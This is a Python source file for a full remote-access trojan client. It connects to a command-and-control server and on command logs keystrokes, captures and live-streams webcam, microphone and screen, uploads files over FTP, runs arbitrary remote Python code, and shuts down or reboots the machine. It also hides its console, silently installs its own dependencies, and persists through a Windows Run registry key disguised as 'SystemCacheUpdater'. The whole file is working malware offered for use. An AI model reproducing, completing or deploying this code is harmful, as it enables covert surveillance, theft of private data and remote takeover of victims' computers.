from socket import *
import os
import sys
import threading
import time
import platform
import subprocess
import importlib
import shutil
import ftplib

# ---------------- Config ----------------
C2_IP    = '127.0.0.1'
C2_PORT  = 8888

ARTIFACT_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')),
                            'SystemCache')
LOG_FILE = os.path.join(ARTIFACT_DIR, 'keylog.txt')
CAM_FILE = os.path.join(ARTIFACT_DIR, 'cam.jpg')
VID_FILE = os.path.join(ARTIFACT_DIR, 'vid.avi')
MIC_FILE = os.path.join(ARTIFACT_DIR, 'mic.wav')
AV_FILE  = os.path.join(ARTIFACT_DIR, 'av.mp4')
AV_VID   = os.path.join(ARTIFACT_DIR, '_av_video.avi')
AV_AUD   = os.path.join(ARTIFACT_DIR, '_av_audio.wav')
SHOT_FILE     = os.path.join(ARTIFACT_DIR, 'screenshot.png')
SCREEN_VID    = os.path.join(ARTIFACT_DIR, 'screen.mp4')
SCREEN_AV_VID = os.path.join(ARTIFACT_DIR, '_screen_v.avi')
SCREEN_AV_WAV = os.path.join(ARTIFACT_DIR, '_screen_a.wav')
SCREEN_AV_MP4 = os.path.join(ARTIFACT_DIR, 'screen_av.mp4')
RCE_DIR       = os.path.join(ARTIFACT_DIR, 'rce')

# ---------------- Media quality ----------------
FRAME_WIDTH  = 1920
FRAME_HEIGHT = 1080
FRAME_SIZE   = (FRAME_WIDTH, FRAME_HEIGHT)
CAM_JPEG_QUALITY = 95
VIDEO_FPS        = 30
VIDEO_CODEC      = 'XVID'
AUDIO_FS         = 44100
AUDIO_CHANNELS   = 1

# Streaming — camera goes out at native 1080p
STREAM_FPS               = 15
STREAM_JPEG_QUALITY      = 70
STREAM_AUDIO_BLOCK       = 2048
STREAM_WIDTH             = FRAME_WIDTH
STREAM_HEIGHT            = FRAME_HEIGHT
STREAM_SCREEN_WIDTH      = 1280
STREAM_SCREEN_HEIGHT     = 720

RUN_KEY_NAME = 'SystemCacheUpdater'
RUN_KEY_PATH = r'Software\Microsoft\Windows\CurrentVersion\Run'

# ---------------- Dependency spec ----------------
REQUIRED_PACKAGES = {
    'opencv-python':  'cv2',
    'sounddevice':    'sounddevice',
    'numpy':          'numpy',
    'pynput':         'pynput',
    'mss':            'mss',
    'pillow':         'PIL',
}

# ---------------- Dependency auto-install ----------------
def _pip_command():
    py = sys.executable
    if py and 'pythonw' in os.path.basename(py).lower():
        candidate = os.path.join(os.path.dirname(py), 'python.exe')
        if os.path.exists(candidate):
            py = candidate
    return [py, '-m', 'pip', 'install', '--quiet', '--disable-pip-version-check']

def _run_hidden(cmd):
    flags = 0x08000000 if platform.system() == 'Windows' else 0
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
                       creationflags=flags, check=False)
    except Exception:
        pass

def _is_importable(name):
    try:
        importlib.import_module(name)
        return True
    except Exception:
        return False

def ensure_dependencies():
    missing = [p for p, i in REQUIRED_PACKAGES.items() if not _is_importable(i)]
    if not missing:
        return
    if not _is_importable('pip'):
        _run_hidden([sys.executable, '-m', 'ensurepip', '--upgrade'])
    base = _pip_command()
    _run_hidden(base + missing)
    still = [p for p, i in REQUIRED_PACKAGES.items() if not _is_importable(i)]
    if still:
        _run_hidden(base + ['--user'] + still)
    importlib.invalidate_caches()

ensure_dependencies()

import cv2
import sounddevice as sd
import numpy as np
import wave
from PIL import Image
import mss
from pynput import keyboard

# ---------------- Setup ----------------
def ensure_artifact_dir():
    try:
        os.makedirs(ARTIFACT_DIR, exist_ok=True)
        os.makedirs(RCE_DIR, exist_ok=True)
    except Exception:
        pass

def install_startup():
    if platform.system() != 'Windows':
        return
    try:
        import winreg
    except ImportError:
        return
    pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
    if not os.path.exists(pythonw):
        pythonw = 'pythonw.exe'
    script = os.path.abspath(__file__)
    cmd = f'cmd /c set _TROJAN_HIDDEN=1 && "{pythonw}" "{script}"'
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_PATH,
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

def is_startup_installed():
    if platform.system() != 'Windows':
        return False
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY_PATH,
                             0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(key, RUN_KEY_NAME)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except Exception:
        return False

# ---------------- Terminal hiding ----------------
def hide_terminal():
    if os.environ.get('_TROJAN_HIDDEN') == '1':
        return False
    os.environ['_TROJAN_HIDDEN'] = '1'
    system = platform.system()
    if system == 'Windows':
        pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = 'pythonw.exe'
        subprocess.Popen(
            [pythonw, os.path.abspath(__file__)],
            creationflags=0x00000008 | 0x08000000,
            close_fds=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    elif system in ('Linux', 'Darwin'):
        try:
            if os.fork() > 0:
                os._exit(0)
        except OSError:
            return False
        os.setsid()
        try:
            if os.fork() > 0:
                os._exit(0)
        except OSError:
            return False
        devnull = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
        if devnull > 2:
            os.close(devnull)
        return False
    return False

# ---------------- Shared state ----------------
log_lock      = threading.Lock()
record_active = threading.Event()
stop_listener = threading.Event()
send_now_flag = threading.Event()
stream_stop   = threading.Event()

# ---------------- Keylogger ----------------
def on_press(key):
    if key == keyboard.Key.f8:
        if record_active.is_set():
            record_active.clear()
        else:
            record_active.set()
        return
    if key == keyboard.Key.f9:
        send_now_flag.set()
        return
    if key == keyboard.Key.f10:
        stop_listener.set()
        record_active.clear()
        stream_stop.set()
        return
    if not record_active.is_set():
        return
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    with log_lock:
        try:
            with open(LOG_FILE, 'a') as f:
                f.write(k + '\n')
        except Exception:
            pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()

# ---------------- Camera ----------------
def _open_camera_1080p():
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return cam
    cam.set(cv2.CAP_PROP_FRAME_WIDTH,  FRAME_WIDTH)
    cam.set(cv2.CAP_PROP_FRAME_HEIGHT, FRAME_HEIGHT)
    cam.set(cv2.CAP_PROP_FPS,          VIDEO_FPS)
    time.sleep(0.5)
    return cam

def capture_camera(path=CAM_FILE):
    cam = _open_camera_1080p()
    ret, frame = cam.read()
    cam.release()
    if not ret:
        return False
    if frame.shape[1] != FRAME_WIDTH or frame.shape[0] != FRAME_HEIGHT:
        frame = cv2.resize(frame, FRAME_SIZE, interpolation=cv2.INTER_CUBIC)
    cv2.imwrite(path, frame,
                [int(cv2.IMWRITE_JPEG_QUALITY), CAM_JPEG_QUALITY])
    return True

def capture_video(path=VID_FILE, duration=5, fps=VIDEO_FPS, size=FRAME_SIZE):
    cam = _open_camera_1080p()
    if not cam.isOpened():
        return False
    fourcc = cv2.VideoWriter_fourcc(*VIDEO_CODEC)
    out = cv2.VideoWriter(path, fourcc, fps, size)
    if not out.isOpened():
        cam.release()
        return False
    start = time.time()
    try:
        while time.time() - start < duration:
            ret, frame = cam.read()
            if not ret:
                break
            if frame.shape[1] != size[0] or frame.shape[0] != size[1]:
                frame = cv2.resize(frame, size, interpolation=cv2.INTER_CUBIC)
            out.write(frame)
    finally:
        cam.release()
        out.release()
    return os.path.exists(path)

# ---------------- Microphone ----------------
def capture_mic(path=MIC_FILE, duration=5, fs=AUDIO_FS):
    recording = sd.rec(int(duration * fs), samplerate=fs,
                       channels=AUDIO_CHANNELS, dtype='int16')
    sd.wait()
    with wave.open(path, 'wb') as wf:
        wf.setnchannels(AUDIO_CHANNELS)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(recording.tobytes())

def _record_audio_threaded(path, duration, stop_evt):
    fs = AUDIO_FS
    total = int(duration * fs)
    chunks = []
    stream = sd.InputStream(samplerate=fs, channels=AUDIO_CHANNELS,
                            dtype='int16')
    stream.start()
    try:
        recorded = 0
        block = 1024
        while recorded < total and not stop_evt.is_set():
            n = min(block, total - recorded)
            data, _ = stream.read(n)
            chunks.append(data.copy())
            recorded += n
    finally:
        stream.stop()
        stream.close()
    if not chunks:
        chunks = [np.zeros((0, AUDIO_CHANNELS), dtype='int16')]
    pcm = np.concatenate(chunks, axis=0).tobytes()
    with wave.open(path, 'wb') as wf:
        wf.setnchannels(AUDIO_CHANNELS)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(pcm)

# ---------------- ffmpeg helpers ----------------
def _find_ffmpeg():
    exe = shutil.which('ffmpeg')
    if exe:
        return exe
    for c in (r'C:\ffmpeg\bin\ffmpeg.exe',
              os.path.join(os.environ.get('ProgramFiles', r'C:\Program Files'),
                           'ffmpeg', 'bin', 'ffmpeg.exe')):
        if os.path.exists(c):
            return c
    return None

def _encode_raw_to_mp4(raw_avi, out_mp4):
    ff = _find_ffmpeg()
    if not ff:
        return False
    cmd = [ff, '-y', '-i', raw_avi,
           '-c:v', 'libx264', '-preset', 'veryfast', '-crf', '23',
           '-pix_fmt', 'yuv420p',
           '-r', '10',
           '-movflags', '+faststart',
           out_mp4]
    try:
        flags = 0x08000000 if platform.system() == 'Windows' else 0
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=flags)
        return r.returncode == 0 and os.path.exists(out_mp4)
    except Exception:
        return False

def _merge_av_raw(raw_video, audio_wav, out_mp4):
    ff = _find_ffmpeg()
    if not ff:
        return False
    cmd = [ff, '-y', '-i', raw_video, '-i', audio_wav,
           '-c:v', 'libx264', '-preset', 'veryfast', '-crf', '23',
           '-pix_fmt', 'yuv420p', '-r', '10',
           '-c:a', 'aac', '-b:a', '128k',
           '-shortest', '-movflags', '+faststart', out_mp4]
    try:
        flags = 0x08000000 if platform.system() == 'Windows' else 0
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           creationflags=flags)
        return r.returncode == 0 and os.path.exists(out_mp4)
    except Exception:
        return False

def capture_av(duration=5):
    for p in (AV_VID, AV_AUD, AV_FILE):
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass
    audio_stop = threading.Event()
    t = threading.Thread(target=_record_audio_threaded,
                         args=(AV_AUD, duration, audio_stop), daemon=True)
    t.start()
    ok_video = capture_video(AV_VID, duration=duration)
    audio_stop.set()
    t.join(timeout=duration + 5)
    if not ok_video or not os.path.exists(AV_AUD):
        return False
    if _merge_av_raw(AV_VID, AV_AUD, AV_FILE):
        for p in (AV_VID, AV_AUD):
            try: os.remove(p)
            except Exception: pass
        return True
    try:
        os.rename(AV_VID, AV_FILE)
    except Exception:
        pass
    return os.path.exists(AV_FILE)

# ---------------- Screen capture ----------------
def capture_screenshot(path=SHOT_FILE):
    try:
        with mss.mss() as sct:
            mon = sct.monitors[1]
            shot = sct.grab(mon)
            img = Image.frombytes('RGB', shot.size, shot.rgb)
            img.save(path, 'PNG')
        return True
    except Exception:
        return False

def _record_screen_raw(raw_path, duration, fps=10, target_size=(1280, 720)):
    out = None
    sct = None
    frames_written = 0
    start = time.time()
    try:
        sct = mss.mss()
        mon = sct.monitors[1]
        tw, th = target_size
        tw -= tw % 2
        th -= th % 2

        fourcc = cv2.VideoWriter_fourcc(*'MJPG')
        out = cv2.VideoWriter(raw_path, fourcc, fps, (tw, th))
        if not out.isOpened():
            return False, 0.0

        interval = 1.0 / fps
        while time.time() - start < duration:
            loop_t0 = time.time()
            if stream_stop.is_set():
                break
            try:
                shot = sct.grab(mon)
                frame = np.array(shot)[:, :, :3]
                frame = cv2.resize(frame, (tw, th),
                                   interpolation=cv2.INTER_AREA)
                out.write(frame)
                frames_written += 1
            except Exception:
                pass
            dt = time.time() - loop_t0
            if dt < interval:
                time.sleep(interval - dt)
    except Exception:
        return False, 0.0
    finally:
        try:
            if out is not None:
                out.release()
        except Exception:
            pass
        try:
            if sct is not None:
                sct.close()
        except Exception:
            pass

    elapsed = max(0.001, time.time() - start)
    actual_fps = fps
    if frames_written > 0:
        actual_fps = max(1.0, min(fps, frames_written / elapsed))
    return frames_written > 0, actual_fps

def capture_screen_video(path=SCREEN_VID, duration=5):
    raw = path + '.raw.avi'
    try:
        if os.path.exists(raw):
            os.remove(raw)
        if os.path.exists(path):
            os.remove(path)
    except Exception:
        pass

    ok, _fps = _record_screen_raw(raw, duration)
    if not ok:
        try:
            if os.path.exists(raw):
                os.remove(raw)
        except Exception:
            pass
        return False

    if _encode_raw_to_mp4(raw, path):
        try:
            os.remove(raw)
        except Exception:
            pass
        return True

    avi_out = SCREEN_VID.replace('.mp4', '.avi')
    try:
        if os.path.exists(avi_out):
            os.remove(avi_out)
        os.replace(raw, avi_out)
        shutil.copyfile(avi_out, path)
        return True
    except Exception:
        return os.path.exists(raw)

def capture_screen_av(duration=5):
    for p in (SCREEN_AV_VID, SCREEN_AV_WAV, SCREEN_AV_MP4):
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass

    audio_stop = threading.Event()
    at = threading.Thread(target=_record_audio_threaded,
                          args=(SCREEN_AV_WAV, duration, audio_stop),
                          daemon=True)
    at.start()

    ok_video, _ = _record_screen_raw(SCREEN_AV_VID, duration)
    audio_stop.set()
    at.join(timeout=duration + 5)

    if not ok_video:
        for p in (SCREEN_AV_VID, SCREEN_AV_WAV):
            try: os.remove(p)
            except Exception: pass
        return False

    if os.path.exists(SCREEN_AV_WAV):
        if _merge_av_raw(SCREEN_AV_VID, SCREEN_AV_WAV, SCREEN_AV_MP4):
            for p in (SCREEN_AV_VID, SCREEN_AV_WAV):
                try: os.remove(p)
                except Exception: pass
            return True

    if _encode_raw_to_mp4(SCREEN_AV_VID, SCREEN_AV_MP4):
        try: os.remove(SCREEN_AV_VID)
        except Exception: pass
        try: os.remove(SCREEN_AV_WAV)
        except Exception: pass
        return True

    fallback = SCREEN_AV_MP4.replace('.mp4', '.avi')
    try:
        if os.path.exists(fallback):
            os.remove(fallback)
        os.replace(SCREEN_AV_VID, fallback)
        shutil.copyfile(fallback, SCREEN_AV_MP4)
        return True
    except Exception:
        return False

# ---------------- FTP upload ----------------
def ftp_upload(host, port, user, password, local_path, remote_name=None):
    try:
        if not os.path.exists(local_path):
            return False
        if remote_name is None:
            remote_name = os.path.basename(local_path)
        ftp = ftplib.FTP()
        ftp.connect(host, int(port), timeout=20)
        ftp.login(user, password)
        try:
            ftp.cwd('uploads')
        except Exception:
            pass
        with open(local_path, 'rb') as f:
            ftp.storbinary(f'STOR {remote_name}', f)
        try:
            ftp.quit()
        except Exception:
            ftp.close()
        return True
    except Exception:
        return False

# ---------------- RCE ----------------
def run_rce(code):
    try:
        os.makedirs(RCE_DIR, exist_ok=True)
        name = f'rce_{int(time.time())}_{os.getpid()}.py'
        path = os.path.join(RCE_DIR, name)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(code)
        py = sys.executable
        if py and 'pythonw' in os.path.basename(py).lower():
            cand = os.path.join(os.path.dirname(py), 'python.exe')
            if os.path.exists(cand):
                py = cand
        flags = 0x08000000 if platform.system() == 'Windows' else 0
        r = subprocess.run([py, path],
                           capture_output=True, text=True, timeout=120,
                           creationflags=flags)
        out = (r.stdout or '') + ('\n' + r.stderr if r.stderr else '')
        try:
            os.remove(path)
        except Exception:
            pass
        return out.encode()
    except subprocess.TimeoutExpired:
        return b'[!] RCE timed out'
    except Exception as e:
        return f'[!] RCE error: {e}'.encode()

# ---------------- Streaming ----------------
def _send_packet(s, tag, payload):
    s.sendall(tag + len(payload).to_bytes(4, 'big') + payload)

def _stream_video(s, fps=STREAM_FPS, quality=STREAM_JPEG_QUALITY,
                  use_camera=True):
    cam = None
    sct = None
    if use_camera:
        cam = _open_camera_1080p()
        if not cam.isOpened():
            _send_packet(s, b'V', b'')
            return
        target_w, target_h = STREAM_WIDTH, STREAM_HEIGHT
    else:
        sct = mss.mss()
        mon = sct.monitors[1]
        target_w, target_h = STREAM_SCREEN_WIDTH, STREAM_SCREEN_HEIGHT

    interval = 1.0 / fps
    try:
        while not stream_stop.is_set():
            t0 = time.time()
            if use_camera:
                ret, frame = cam.read()
                if not ret:
                    break
            else:
                shot = sct.grab(mon)
                frame = np.array(shot)[:, :, :3]
            frame = cv2.resize(frame, (target_w, target_h),
                               interpolation=cv2.INTER_AREA)
            ok, jpg = cv2.imencode(
                '.jpg', frame,
                [int(cv2.IMWRITE_JPEG_QUALITY), quality])
            if not ok:
                continue
            _send_packet(s, b'V', jpg.tobytes())
            dt = time.time() - t0
            if dt < interval:
                time.sleep(interval - dt)
    finally:
        if cam is not None:
            cam.release()
        if sct is not None:
            sct.close()

def _stream_audio(s, block=STREAM_AUDIO_BLOCK):
    fs = AUDIO_FS
    try:
        stream = sd.InputStream(samplerate=fs, channels=AUDIO_CHANNELS,
                                dtype='int16', blocksize=block)
        stream.start()
        try:
            while not stream_stop.is_set():
                data, _ = stream.read(block)
                _send_packet(s, b'A', data.tobytes())
        finally:
            stream.stop()
            stream.close()
    except Exception:
        pass

def _drain_stop(s, timeout=1.0):
    s.settimeout(timeout)
    try:
        while True:
            try:
                data = s.recv(1024)
            except timeout:
                return
            if not data:
                return
            if b'STOP' in data:
                return
    except Exception:
        return
    finally:
        try:
            s.settimeout(None)
        except Exception:
            pass

def stream_video(s, with_audio=False, use_camera=True):
    stream_stop.clear()
    try:
        s.sendall(b'STREAM_START\n')
    except Exception:
        return

    vt = threading.Thread(target=_stream_video, args=(s,),
                          kwargs={'use_camera': use_camera}, daemon=True)
    vt.start()
    at = None
    if with_audio:
        at = threading.Thread(target=_stream_audio, args=(s,), daemon=True)
        at.start()

    _drain_stop(s)
    stream_stop.set()
    vt.join(timeout=5)
    if at is not None:
        at.join(timeout=3)

    try:
        s.sendall(b'STREAM_END\n')
    except Exception:
        pass
    try:
        s.settimeout(0.5)
        try:
            s.recv(1024)
        except Exception:
            pass
    finally:
        try:
            s.settimeout(None)
        except Exception:
            pass

# ---------------- Protocol helpers ----------------
def send_file(sock, path):
    if not os.path.exists(path):
        sock.send(b'0'.ljust(16))
        return
    with open(path, 'rb') as f:
        data = f.read()
    sock.send(str(len(data)).encode().ljust(16))
    sock.sendall(data)

def send_blob(sock, tag, data):
    sock.send(tag)
    sock.send(str(len(data)).encode().ljust(16))
    sock.sendall(data)

def send_logfile(sock):
    sock.send(b'LOG')
    send_file(sock, LOG_FILE)

def reset_logfile():
    with log_lock:
        try:
            open(LOG_FILE, 'wb').close()
        except Exception:
            pass

def recv_line(sock):
    buf = b''
    while not buf.endswith(b'\n'):
        chunk = sock.recv(1)
        if not chunk:
            return ''
        buf += chunk
    return buf.decode().strip()

def recv_exact(sock, n):
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            break
        data += chunk
    return data

# ---------------- Keylogger modes ----------------
def keylogger_mode_duration(s, duration):
    reset_logfile()
    record_active.set()
    time.sleep(duration)
    record_active.clear()
    send_logfile(s)

def keylogger_mode_manual(s):
    record_active.clear()
    s.settimeout(1.0)
    while True:
        if record_active.is_set():
            while record_active.is_set() and not stop_listener.is_set():
                time.sleep(0.2)
                try:
                    data = s.recv(1024)
                    if data and data.decode().strip() == 'STOP':
                        record_active.clear()
                        break
                except timeout:
                    pass
            send_logfile(s)
            return
        try:
            data = s.recv(1024)
            if data and data.decode().strip() == 'STOP':
                return
        except timeout:
            pass

def keylogger_mode_continuous(s):
    record_active.set()
    s.settimeout(1.0)
    while not stop_listener.is_set():
        if send_now_flag.is_set():
            send_now_flag.clear()
            send_logfile(s)
        try:
            data = s.recv(1024)
            if data:
                cmd = data.decode().strip()
                if cmd == 'STOP':
                    record_active.clear()
                    return
                if cmd == 'SEND':
                    send_logfile(s)
                if cmd == 'RESET':
                    reset_logfile()
        except timeout:
            continue

# ---------------- Command handling ----------------
def handle_command(s, choice):
    if choice == '1':
        os.system('shutdown -s -t 1')
        s.send(b'OK\n')

    elif choice == '2':
        os.system('shutdown -r -t 1')
        s.send(b'OK\n')

    elif choice == '3':
        if capture_camera():
            s.send(b'CAM'); send_file(s, CAM_FILE)
        else:
            s.send(b'NOCAM')

    elif choice == '4':
        duration = int(recv_line(s) or 5)
        if capture_video(VID_FILE, duration=duration):
            s.send(b'VID'); send_file(s, VID_FILE)
        else:
            s.send(b'NOVID')

    elif choice == '5':
        duration = int(recv_line(s) or 5)
        capture_mic(MIC_FILE, duration=duration)
        s.send(b'MIC'); send_file(s, MIC_FILE)

    elif choice == '6':
        mode = recv_line(s)
        if mode == '1':
            duration = int(recv_line(s) or 10)
            keylogger_mode_duration(s, duration)
        elif mode == '2':
            keylogger_mode_manual(s)
        elif mode == '3':
            keylogger_mode_continuous(s)

    elif choice == '7':
        s.send(b'PERSIST_YES\n' if is_startup_installed() else b'PERSIST_NO\n')

    elif choice == '8':
        install_startup()
        s.send(b'PERSIST_INSTALLED\n' if is_startup_installed()
               else b'PERSIST_FAILED\n')

    elif choice == '9':
        duration = int(recv_line(s) or 5)
        if capture_av(duration=duration):
            s.send(b'AV'); send_file(s, AV_FILE)
        else:
            s.send(b'NOAV')

    elif choice == '10':
        spec = recv_line(s)
        try:
            host, port, user, pw, local = spec.split('|', 4)
        except ValueError:
            s.send(b'FTP_BAD\n'); return True
        ok = ftp_upload(host, int(port), user, pw, local)
        s.send(b'FTP_OK\n' if ok else b'FTP_FAIL\n')

    elif choice == '11':
        size = int(recv_line(s) or 0)
        code = recv_exact(s, size).decode(errors='replace')
        out = run_rce(code)
        send_blob(s, b'RCE', out)

    elif choice == '12':
        if capture_screenshot():
            s.send(b'SHOT'); send_file(s, SHOT_FILE)
        else:
            s.send(b'NOSHOT')

    elif choice == '13':
        duration = int(recv_line(s) or 5)
        if capture_screen_video(SCREEN_VID, duration):
            s.send(b'SCRVID'); send_file(s, SCREEN_VID)
        else:
            s.send(b'NOSCRVID')

    elif choice == '14':
        duration = int(recv_line(s) or 5)
        if capture_screen_av(duration):
            s.send(b'SCRAV'); send_file(s, SCREEN_AV_MP4)
        else:
            s.send(b'NOSCRAV')

    elif choice == '15':
        stream_video(s, with_audio=False, use_camera=True)

    elif choice == '16':
        stream_video(s, with_audio=True, use_camera=True)

    elif choice == '17':
        stream_video(s, with_audio=False, use_camera=False)

    elif choice == '18':
        stream_video(s, with_audio=True, use_camera=False)

    elif choice.lower() in ('exit', 'quit'):
        s.send(b'BYE\n')
        return False

    else:
        s.send(b'ERR\n')

    return True

# ---------------- Main ----------------
def main():
    ensure_artifact_dir()
    install_startup()
    start_keylogger()

    while not stop_listener.is_set():
        try:
            s = socket()
            s.connect((C2_IP, C2_PORT))
        except Exception:
            time.sleep(5)
            continue

        try:
            hostname = platform.node() or 'unknown'
            s.send(('HELLO:' + hostname + '\n').encode())
        except Exception:
            pass

        while not stop_listener.is_set():
            try:
                choice = recv_line(s)
            except Exception:
                break
            if not choice:
                break
            try:
                if not handle_command(s, choice):
                    break
            except Exception:
                break

        try:
            s.close()
        except Exception:
            pass

        time.sleep(2)

if __name__ == '__main__':
    if hide_terminal():
        sys.exit(0)
    main()